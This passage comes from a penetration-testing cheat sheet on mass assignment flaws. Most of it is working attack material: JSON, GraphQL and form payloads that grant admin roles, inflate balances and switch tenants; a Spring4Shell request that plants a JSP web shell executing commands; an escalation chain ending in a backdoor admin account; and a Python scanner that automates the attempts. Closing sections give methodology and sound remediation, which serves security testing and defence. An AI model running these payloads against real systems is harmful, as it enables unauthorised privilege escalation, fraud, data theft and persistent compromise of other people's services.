  "trial_end": "2099-12-31T23:59:59Z",
  "trial_expires_at": "2099-12-31T23:59:59Z",
  "is_trial": true,
  "plan": "enterprise"
}
```

```http [Mark Content as Featured/Promoted]
PUT /api/posts/100 HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "title": "My Post",
  "featured": true,
  "is_featured": true,
  "promoted": true,
  "pinned": true,
  "priority": 999,
  "sort_order": -1
}
```
::

### GraphQL Mass Assignment

::collapsible
---
label: "GraphQL Mutation Payloads"
---

```graphql [GraphQL — Registration with Admin Role]
mutation {
  createUser(input: {
    username: "attacker"
    email: "attacker@evil.com"
    password: "password123"
    role: "admin"
    isAdmin: true
    verified: true
    plan: "enterprise"
  }) {
    id
    username
    role
    isAdmin
  }
}
```

```graphql [GraphQL — Profile Update with Escalation]
mutation {
  updateUser(id: "1001", input: {
    username: "attacker"
    role: "admin"
    permissions: ["read", "write", "delete", "manage_users"]
    isAdmin: true
    balance: 999999
    plan: "enterprise"
  }) {
    id
    username
    role
    isAdmin
    balance
    plan
  }
}
```

```graphql [GraphQL — Introspection to Find Fields]
{
  __type(name: "User") {
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}

# Also check mutation input types:
{
  __type(name: "CreateUserInput") {
    inputFields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

```graphql [GraphQL — Discover All Types]
{
  __schema {
    types {
      name
      kind
      fields {
        name
      }
      inputFields {
        name
      }
    }
  }
}
```
::

### Nested Object & Relationship Manipulation

::collapsible
---
label: "Nested Object Mass Assignment"
---

```http [Nested Object — User with Profile]
PUT /api/users/me HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "profile": {
    "bio": "Hello",
    "role": "admin",
    "is_admin": true,
    "permissions": ["all"]
  }
}
```

```http [Nested Object — User with Organization]
PUT /api/users/me HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "organization": {
    "id": "target_org",
    "role": "owner",
    "permissions": ["manage_organization"]
  }
}
```

```http [Nested Object — User with Settings]
PUT /api/users/me HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "settings": {
    "is_admin": true,
    "feature_flags": {
      "beta_features": true,
      "admin_panel": true,
      "debug_mode": true
    }
  }
}
```

```http [Deep Nesting — Multi-Level]
PUT /api/users/me HTTP/1.1
Content-Type: application/json

{
  "profile": {
    "account": {
      "security": {
        "role": "admin",
        "mfa_enabled": false,
        "ip_whitelist": []
      },
      "billing": {
        "plan": "enterprise",
        "balance": 999999
      }
    }
  }
}
```

```http [Array of Nested Objects]
PUT /api/users/me HTTP/1.1
Content-Type: application/json

{
  "roles": [
    {"name": "user", "active": true},
    {"name": "admin", "active": true},
    {"name": "superadmin", "active": true}
  ],
  "team_memberships": [
    {"team_id": "admin-team", "role": "owner"}
  ]
}
```

```http [Relationship Manipulation — Foreign Keys]
PUT /api/users/me HTTP/1.1
Content-Type: application/json

{
  "role_id": 1,
  "group_id": 1,
  "organization_id": "target_org_id",
  "department_id": 1,
  "manager_id": null,
  "parent_id": null
}
```
::

### Framework-Specific Exploitation

::collapsible
---
label: "Rails-Specific Payloads"
---

```http [Rails — Nested Attributes]
PUT /api/users/1001 HTTP/1.1
Content-Type: application/json

{
  "user": {
    "username": "attacker",
    "roles_attributes": [
      {"name": "admin", "active": true}
    ],
    "profile_attributes": {
      "is_admin": true,
      "verified": true
    }
  }
}
```

```http [Rails — Association IDs]
PUT /api/users/1001 HTTP/1.1
Content-Type: application/json

{
  "user": {
    "role_ids": [1, 2, 3],
    "group_ids": [1],
    "permission_ids": [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
  }
}
```

```http [Rails — Polymorphic Association]
PUT /api/comments/100 HTTP/1.1
Content-Type: application/json

{
  "comment": {
    "body": "Test",
    "commentable_type": "Admin::Setting",
    "commentable_id": 1
  }
}
```
::

::collapsible
---
label: "Django-Specific Payloads"
---

```http [Django — Direct Model Update]
PUT /api/users/me/ HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "is_staff": true,
  "is_superuser": true,
  "is_active": true,
  "groups": [1],
  "user_permissions": [1, 2, 3, 4, 5]
}
```

```http [Django — Related Manager Manipulation]
PUT /api/users/me/ HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "profile": {
    "role": "admin",
    "organization_id": 1
  }
}
```
::

::collapsible
---
label: "Laravel-Specific Payloads"
---

```http [Laravel — Without $fillable Protection]
POST /api/users HTTP/1.1
Content-Type: application/json

{
  "name": "attacker",
  "email": "attacker@evil.com",
  "password": "password123",
  "is_admin": 1,
  "role": "admin",
  "email_verified_at": "2024-01-01 00:00:00"
}
```

```http [Laravel — JSON Column Manipulation]
PUT /api/users/me HTTP/1.1
Content-Type: application/json

{
  "name": "attacker",
  "settings->role": "admin",
  "meta->is_admin": true,
  "preferences->plan": "enterprise"
}
```
::

::collapsible
---
label: "Spring Boot-Specific Payloads"
---

```http [Spring — Class-Level Binding]
POST /register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=attacker&email=attacker@evil.com&password=pass123&role=ROLE_ADMIN&admin=true&class.module.classLoader.resources.context.parent.pipeline.first.pattern=PAYLOAD
```

```http [Spring — Nested Property Binding]
POST /register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=attacker&email=attacker@evil.com&authority.role=ADMIN&permissions[0]=READ&permissions[1]=WRITE&permissions[2]=ADMIN
```

```http [Spring — Spring4Shell Style (CVE-2022-22965)]
POST /register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```
::

---

## Privilege Escalation Chains

::card-group
  ::card
  ---
  title: "Register → Instant Admin"
  icon: i-lucide-user-plus
  ---
  Submit `role=admin` during registration. If the model accepts it, the new account is created with admin privileges. No further exploitation needed — direct admin access from registration.
  ::

  ::card
  ---
  title: "Profile Update → Privilege Elevation"
  icon: i-lucide-user-cog
  ---
  Modify your own profile with `is_admin=true` or `role=superadmin`. The profile update endpoint is the most common mass assignment vector because it explicitly accepts user input for model updates.
  ::

  ::card
  ---
  title: "Verification Bypass → Unrestricted Access"
  icon: i-lucide-badge-check
  ---
  Set `verified=true` and `email_confirmed=true` to bypass email verification requirements. Access features restricted to verified users without going through the verification process.
  ::

  ::card
  ---
  title: "2FA Disable → Account Takeover"
  icon: i-lucide-shield-off
  ---
  Set `two_factor_enabled=false` via mass assignment. If combined with credential stuffing or password reset, this eliminates the last defense against account takeover.
  ::

  ::card
  ---
  title: "Balance Injection → Financial Fraud"
  icon: i-lucide-banknote
  ---
  Set `balance=999999` or `credits=999999` to give yourself unlimited funds. Withdraw, purchase items, or transfer funds generated from thin air.
  ::

  ::card
  ---
  title: "Plan Upgrade → Feature Theft"
  icon: i-lucide-crown
  ---
  Set `plan=enterprise` to unlock premium features without payment. Access enterprise-only API endpoints, increase rate limits, unlock storage, and use premium integrations.
  ::

  ::card
  ---
  title: "Tenant Switch → Cross-Organization Access"
  icon: i-lucide-building
  ---
  Modify `org_id` or `tenant_id` to switch your account to a different organization. Access that organization's data, users, and resources.
  ::

  ::card
  ---
  title: "Token Override → Persistent Backdoor"
  icon: i-lucide-key
  ---
  Set `api_key` or `auth_token` to an attacker-controlled value. Creates a persistent backdoor that survives password changes and session invalidation.
  ::
::

### Real-World Attack Chain

::steps{level="4"}

#### Discover Hidden Fields via API Response

```http
GET /api/users/me HTTP/1.1
Authorization: Bearer USER_TOKEN

# Response reveals: id, username, email, role, is_admin, plan, credits, verified, 2fa_enabled
```

#### Escalate to Admin via Profile Update

```http
PUT /api/users/me HTTP/1.1
Authorization: Bearer USER_TOKEN
Content-Type: application/json

{"role": "admin", "is_admin": true}

# Response: 200 OK — role and is_admin updated
```

#### Access Admin Panel

```http
GET /api/admin/dashboard HTTP/1.1
Authorization: Bearer USER_TOKEN

# Previously returned 403, now returns 200 with admin dashboard data
```

#### Extract Sensitive Data

```http
GET /api/admin/users?per_page=99999 HTTP/1.1
Authorization: Bearer USER_TOKEN

# Returns all users with emails, roles, and sensitive data
```

#### Create Persistent Backdoor

```http
POST /api/admin/users HTTP/1.1
Authorization: Bearer USER_TOKEN
Content-Type: application/json

{
  "username": "backdoor_admin",
  "email": "backdoor@evil.com",
  "password": "backdoor_password",
  "role": "superadmin",
  "is_admin": true,
  "verified": true,
  "two_factor_enabled": false
}
```

::

---

## Automation & Tooling

### Mass Assignment Scanner Script

::collapsible
---
label: "Python Mass Assignment Scanner"
---

```python [mass_assignment_scanner.py]
#!/usr/bin/env python3
"""
Mass Assignment Vulnerability Scanner
Discovers and tests for mass assignment vulnerabilities.
"""

import requests
import json
import sys
from copy import deepcopy
import warnings
warnings.filterwarnings('ignore')

# === CONFIGURATION ===
BASE_URL = "http://target.com"
AUTH_HEADER = {"Authorization": "Bearer YOUR_TOKEN"}
TIMEOUT = 10

# === SENSITIVE PARAMETERS TO TEST ===
PRIVILEGE_PARAMS = {
    "role": ["admin", "administrator", "superadmin", "root", "ROLE_ADMIN"],
    "is_admin": [True, 1, "true", "1", "yes"],
    "isAdmin": [True, 1, "true"],
    "admin": [True, 1, "true"],
    "is_staff": [True, 1],
    "isStaff": [True, 1],
    "is_superuser": [True, 1],
    "isSuperuser": [True, 1],
    "user_type": ["admin", "administrator"],
    "userType": ["admin", "administrator"],
    "access_level": [10, 999, "admin"],
    "privilege": [10, 999, "admin"],
    "permissions": [["read", "write", "delete", "admin", "manage"]],
}

STATUS_PARAMS = {
    "verified": [True, 1],
    "is_verified": [True, 1],
    "email_verified": [True, 1],
    "email_confirmed": [True, 1],
    "active": [True, 1],
    "is_active": [True, 1],
    "approved": [True, 1],
    "locked": [False, 0],
    "banned": [False, 0],
    "suspended": [False, 0],
    "two_factor_enabled": [False, 0],
    "mfa_enabled": [False, 0],
}

FINANCIAL_PARAMS = {
    "balance": [999999, 999999.99],
    "credits": [999999],
    "points": [999999],
    "plan": ["enterprise", "premium", "unlimited"],
    "tier": ["enterprise", "premium"],
    "subscription_type": ["enterprise"],
}

OWNERSHIP_PARAMS = {
    "user_id": [1],
    "owner_id": [1],
    "org_id": ["target_org"],
    "tenant_id": ["target_tenant"],
    "group_id": [1],
}


def discover_fields(endpoint, method="GET"):
    """Discover all model fields from API response."""
    print(f"\n[*] Discovering fields from {method} {endpoint}")
    
    try:
        if method == "GET":
            resp = requests.get(f"{BASE_URL}{endpoint}", headers=AUTH_HEADER, timeout=TIMEOUT, verify=False)
        else:
            resp = requests.options(f"{BASE_URL}{endpoint}", headers=AUTH_HEADER, timeout=TIMEOUT, verify=False)
        
        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, dict):
                fields = list(data.keys())
            elif isinstance(data, list) and len(data) > 0:
                fields = list(data[0].keys())
            else:
                fields = []
            
            print(f"[+] Discovered {len(fields)} fields: {fields}")
            return data, fields
        else:
            print(f"[-] Status {resp.status_code}")
            return None, []
    except Exception as e:
        print(f"[-] Error: {e}")
        return None, []


def test_mass_assignment(endpoint, original_data, param_name, param_value):
    """Test a single mass assignment payload."""
    test_data = deepcopy(original_data) if original_data else {}
    test_data[param_name] = param_value
    
    try:
        resp = requests.put(
            f"{BASE_URL}{endpoint}",
            headers={**AUTH_HEADER, "Content-Type": "application/json"},
            json=test_data,
            timeout=TIMEOUT,
            verify=False
        )
        
        if resp.status_code in [200, 201, 204]:
            # Verify the change
            verify_resp = requests.get(
                f"{BASE_URL}{endpoint}",
                headers=AUTH_HEADER,
                timeout=TIMEOUT,
                verify=False
            )
            
            if verify_resp.status_code == 200:
                verify_data = verify_resp.json()
                actual_value = verify_data.get(param_name)
                
                if actual_value == param_value or str(actual_value) == str(param_value):
                    return {
                        "vulnerable": True,
                        "param": param_name,
                        "value": param_value,
                        "verified": True,
                        "response_status": resp.status_code
                    }
        
        return {"vulnerable": False, "param": param_name}
        
    except Exception as e:
        return {"vulnerable": False, "param": param_name, "error": str(e)}


def scan_endpoint(endpoint, original_data=None):
    """Scan an endpoint for mass assignment vulnerabilities."""
    print(f"\n{'='*60}")
    print(f"  Scanning: {endpoint}")
    print(f"{'='*60}")
    
    if not original_data:
        original_data, _ = discover_fields(endpoint)
    
    if not original_data:
        print("[-] Could not retrieve original data. Using empty object.")
        original_data = {}
    
    all_params = {}
    all_params.update(PRIVILEGE_PARAMS)
    all_params.update(STATUS_PARAMS)
    all_params.update(FINANCIAL_PARAMS)
    all_params.update(OWNERSHIP_PARAMS)
    
    findings = []
    
    for param_name, test_values in all_params.items():
        for value in test_values:
            result = test_mass_assignment(endpoint, original_data, param_name, value)
            
            if result.get("vulnerable"):
                findings.append(result)
                print(f"  [+] VULNERABLE: {param_name}={value}")
                print(f"      Status: {result['response_status']}, Verified: {result['verified']}")
                break  # Found vulnerability for this param, move to next
            else:
                sys.stdout.write(f"\r  [-] Testing: {param_name}={value}                    ")
                sys.stdout.flush()
    
    print(f"\n\n  Results: {len(findings)} mass assignment vulnerabilities found")
    
    return findings


# === MAIN ===
if __name__ == "__main__":
    print("=" * 60)
    print("  Mass Assignment Scanner")
    print("=" * 60)
    print(f"  Target: {BASE_URL}")
    
    endpoints = [
        "/api/users/me",
        "/api/profile",
        "/api/account",
        "/api/settings",
    ]
    
    all_findings = []
    for endpoint in endpoints:
        findings = scan_endpoint(endpoint)
        all_findings.extend(findings)
    
    print(f"\n{'='*60}")
    print(f"  Total Vulnerabilities: {len(all_findings)}")
    print(f"{'='*60}")
    
    for f in all_findings:
        print(f"  • {f['param']} = {f['value']}")
```
::

### Burp Suite Extension Approach

::collapsible
---
label: "Manual Testing with Burp Suite"
---

::steps{level="4"}

#### Capture Normal Request

Intercept a legitimate profile update or registration request in Burp Proxy.

```http
PUT /api/users/me HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer TOKEN

{"username": "testuser", "email": "test@test.com"}
```

#### Send to Repeater and Add Parameters

Add sensitive parameters one at a time and send:

```http
PUT /api/users/me HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer TOKEN

{
  "username": "testuser",
  "email": "test@test.com",
  "role": "admin"
}
```

#### Compare Response with GET Request

```http
GET /api/users/me HTTP/1.1
Host: target.com
Authorization: Bearer TOKEN
```

Check if `role` changed to `admin` in the response.

#### Use Param Miner for Discovery

Install Param Miner Burp extension. Right-click the request → Extensions → Param Miner → Guess JSON parameters.

Param Miner will fuzz the JSON body with common parameter names and detect which ones the application accepts.

::
::

---

## Methodology

::accordion
  :::accordion-item
  ---
  icon: i-lucide-search
  label: "Phase 1 — Reconnaissance"
  ---

  Gather information about the application's data model.

  ::field-group
    ::field{name="API Documentation" type="high-priority"}
    Review Swagger/OpenAPI specs, GraphQL schema, API docs for model definitions and field names.
    ::

    ::field{name="API Responses" type="high-priority"}
    Send GET requests to all resource endpoints. Response bodies reveal all model fields.
    ::

    ::field{name="JavaScript Source" type="medium-priority"}
    Review client-side code for TypeScript interfaces, Pydantic models, form field definitions, and GraphQL queries.
    ::

    ::field{name="Error Messages" type="medium-priority"}
    Submit invalid data and analyze error responses for field names and validation rules.
    ::

    ::field{name="Registration/Signup Forms" type="high-priority"}
    Compare visible form fields with the full data model. Hidden fields are mass assignment targets.
    ::

    ::field{name="GraphQL Introspection" type="high-priority"}
    Query `__schema` and `__type` to discover all mutation input fields.
    ::
  ::

  :::

  :::accordion-item
  ---
  icon: i-lucide-list
  label: "Phase 2 — Field Mapping"
  ---

  Create a complete map of all model fields and their sensitivity.

  | Field Category | Example Fields | Sensitivity |
  |---------------|---------------|-------------|
  | **User-controllable** | `username`, `email`, `bio`, `avatar` | Low — Expected |
  | **Privilege** | `role`, `is_admin`, `permissions` | **Critical** |
  | **Financial** | `balance`, `credits`, `plan`, `price` | **Critical** |
  | **Status** | `verified`, `active`, `locked`, `banned` | **High** |
  | **Security** | `password`, `api_key`, `2fa_enabled` | **Critical** |
  | **Ownership** | `user_id`, `org_id`, `tenant_id` | **High** |
  | **Metadata** | `created_at`, `updated_at`, `id` | **Medium** |
  | **Internal** | `internal`, `debug`, `test` | **Medium** |

  :::

  :::accordion-item
  ---
  icon: i-lucide-flask-conical
  label: "Phase 3 — Testing"
  ---

  Test each endpoint that accepts user input (POST, PUT, PATCH) for mass assignment.

  **Testing Strategy:**

  1. **One parameter at a time** — Add a single sensitive parameter and test
  2. **Multiple parameters** — Submit several sensitive parameters together
  3. **Different value types** — Try boolean, string, integer, array, and object values
  4. **Different content types** — Test JSON, form-urlencoded, and multipart
  5. **Nested objects** — Test nested property injection
  6. **Different endpoints** — Test registration, profile update, settings, and resource creation

  **Priority Endpoints:**

  | Endpoint Type | Why It's Important |
  |--------------|-------------------|
  | `POST /register` or `/signup` | New account creation with admin role |
  | `PUT /profile` or `/me` | Self-service escalation |
  | `PUT /settings` or `/preferences` | Config-level manipulation |
  | `POST /resources` | New resource with modified properties |
  | `PATCH /users/:id` | User modification |
  | `POST /api/*/` | Any create endpoint |
  | `PUT /api/*/` | Any update endpoint |

  :::

  :::accordion-item
  ---
  icon: i-lucide-check-circle
  label: "Phase 4 — Verification"
  ---

  Confirm that mass assignment actually changed the sensitive property.

  1. **GET request after PUT** — Verify the field value changed
  2. **Functional verification** — Try to access admin panel, use premium features, or perform privileged actions
  3. **Session refresh** — Log out and log back in to confirm the role/permission change persists
  4. **Different client** — Verify from a different browser/session

  :::

  :::accordion-item
  ---
  icon: i-lucide-file-text
  label: "Phase 5 — Documentation"
  ---

  Document with:

  - Exact request showing the mass assignment payload
  - Before/after screenshots of the profile or resource
  - Demonstration of elevated access (admin panel screenshot, etc.)
  - Business impact assessment
  - Specific remediation recommendation for the framework in use

  :::
::

---

## Remediation & Defense

::card-group
  ::card
  ---
  title: Explicit Allowlists (Whitelisting)
  icon: i-lucide-shield-check
  ---
  **Define exactly which fields** are allowed for each operation. Never use `fields = '__all__'` or accept raw request data.

  ```python
  # Django REST Framework
  class UserSerializer(serializers.ModelSerializer):
      class Meta:
          model = User
          fields = ['username', 'email', 'bio']  # ONLY these fields
          read_only_fields = ['role', 'is_admin', 'balance']
  ```

  ```ruby
  # Rails Strong Parameters
  params.require(:user).permit(:username, :email, :password)
  ```

  ```php
  // Laravel $fillable
  protected $fillable = ['username', 'email', 'password'];
  ```

  ```javascript
  // Node.js — Pick allowed fields
  const allowed = pick(req.body, ['username', 'email', 'bio']);
  ```
  ::

  ::card
  ---
  title: Data Transfer Objects (DTOs)
  icon: i-lucide-file-input
  ---
  Create **separate input models** for each operation. The DTO only contains fields the user is allowed to set.

  ```java
  // Registration DTO — no role or admin fields
  public class RegisterDTO {
      String username;
      String email;
      String password;
  }

  // Profile Update DTO — no privilege fields
  public class UpdateProfileDTO {
      String bio;
      String avatar;
  }
  ```

  Never bind request data directly to database models.
  ::

  ::card
  ---
  title: Read-Only Fields
  icon: i-lucide-lock
  ---
  Mark sensitive fields as **read-only** in serializers and model configurations.

  ```python
  class UserSerializer(serializers.ModelSerializer):
      class Meta:
          model = User
          fields = '__all__'
          read_only_fields = [
              'role', 'is_admin', 'is_staff', 'is_superuser',
              'balance', 'credits', 'verified', 'plan',
              'created_at', 'updated_at'
          ]
  ```
  ::

  ::card
  ---
  title: Blocklist Sensitive Fields ($guarded)
  icon: i-lucide-shield-off
  ---
  As a **secondary** defense (not primary — allowlists are preferred), block known sensitive fields.

  ```php
  // Laravel $guarded
  protected $guarded = [
      'role', 'is_admin', 'balance', 'verified',
      'plan', 'api_key', 'password_reset_token'
  ];
  ```

  ::warning
  Blocklists are **incomplete by nature**. New fields added to the model may not be added to the blocklist. Always prefer allowlists.
  ::

  ::card
  ---
  title: Different Models per Operation
  icon: i-lucide-layers
  ---
  Use **different serializers/forms** for different operations and different user roles.

  ```python
  class UserCreateSerializer(serializers.ModelSerializer):
      class Meta:
          fields = ['username', 'email', 'password']

  class UserUpdateSerializer(serializers.ModelSerializer):
      class Meta:
          fields = ['username', 'bio', 'avatar']

  class AdminUserUpdateSerializer(serializers.ModelSerializer):
      class Meta:
          fields = ['username', 'email', 'role', 'is_admin', 'verified']
  ```

  Regular users use `UserUpdateSerializer`; admins use `AdminUserUpdateSerializer`.
  ::

  ::card
  ---
  title: Server-Side Defaults
  icon: i-lucide-server
  ---
  Set sensitive values **server-side**, never from request data.

  ```python
  def create_user(request):
      user = User(
          username=request.data['username'],
          email=request.data['email'],
          password=hash(request.data['password']),
          role='user',            # SERVER-SET — Never from request
          is_admin=False,         # SERVER-SET
          balance=0,              # SERVER-SET
          verified=False,         # SERVER-SET
          plan='free',            # SERVER-SET
      )
      user.save()
  ```
  ::

  ::card
  ---
  title: Automated Testing in CI/CD
  icon: i-lucide-git-branch
  ---
  Add automated mass assignment tests to your CI/CD pipeline.

  ```python
  def test_registration_mass_assignment():
      """Verify registration doesn't accept admin role."""
      response = client.post('/api/register', json={
          'username': 'test',
          'email': 'test@test.com',
          'password': 'password123',
          'role': 'admin',
          'is_admin': True,
      })
      
      user = User.objects.get(username='test')
      assert user.role == 'user'       # Should be default
      assert user.is_admin == False    # Should be default
  ```
  ::

  ::card
  ---
  title: Request Logging & Monitoring
  icon: i-lucide-scroll-text
  ---
  Log and alert when requests contain unexpected parameters, especially privilege-related ones like `role`, `admin`, `balance`, `permissions`. This provides early detection of mass assignment attempts.
  ::

  ::card
  ---
  title: GraphQL Input Type Restriction
  icon: i-lucide-webhook
  ---
  Define **separate input types** for mutations that exclude sensitive fields.

  ```graphql
  input CreateUserInput {
    username: String!
    email: String!
    password: String!
    # NO role, isAdmin, balance, plan fields
  }

  type Mutation {
    createUser(input: CreateUserInput!): User!
  }
  ```
  ::

---

## Tools

::card-group
  ::card
  ---
  title: Burp Suite + Param Miner
  icon: i-lucide-bug
  to: https://portswigger.net/burp
  target: _blank
  ---
  Intercept and modify requests with Repeater. Param Miner extension discovers hidden parameters by fuzzing JSON bodies and query strings with common field names.
  ::

  ::card
  ---
  title: Arjun
  icon: i-lucide-radar
  to: https://github.com/s0md3v/Arjun
  target: _blank
  ---
  HTTP parameter discovery tool. Tests thousands of parameter names against endpoints to find hidden parameters that the application accepts but doesn't expose in the UI.
  ::

  ::card
  ---
  title: AutoRepeater (Burp Extension)
  icon: i-lucide-repeat
  to: https://portswigger.net/bappstore/f89f2837c22c4ab4b772571571907571
  target: _blank
  ---
  Automatically adds mass assignment parameters to every request passing through Burp Proxy. Detects when added parameters change the response.
  ::

  ::card
  ---
  title: Postman / Insomnia
  icon: i-lucide-send
  to: https://www.postman.com/
  target: _blank
  ---
  API testing tools for crafting complex JSON payloads with nested objects, arrays, and multiple sensitive parameters. Useful for systematic manual testing.
  ::

  ::card
  ---
  title: GraphQL Voyager
  icon: i-lucide-compass
  to: https://github.com/graphql-kit/graphql-voyager
  target: _blank
  ---
  Visualizes GraphQL schema and relationships. Reveals all types, fields, and mutation inputs — essential for identifying mass assignment targets in GraphQL APIs.
  ::

  ::card
  ---
  title: InQL (Burp Extension)
  icon: i-lucide-webhook
  to: https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f
  target: _blank
  ---
  GraphQL introspection and query generator for Burp Suite. Automatically extracts schema and generates mutation queries for mass assignment testing.
  ::

  ::card
  ---
  title: ffuf
  icon: i-lucide-zap
  to: https://github.com/ffuf/ffuf
  target: _blank
  ---
  Fast web fuzzer for parameter discovery. Use with JSON body fuzzing mode and mass assignment parameter wordlists.
  ::

  ::card
  ---
  title: Custom Scripts
  icon: i-lucide-terminal
  to: https://github.com/swisskyrepo/PayloadsAllTheThings
  target: _blank
  ---
  Use the Python scanner provided above or build custom scripts targeting specific frameworks and API patterns.
  ::
::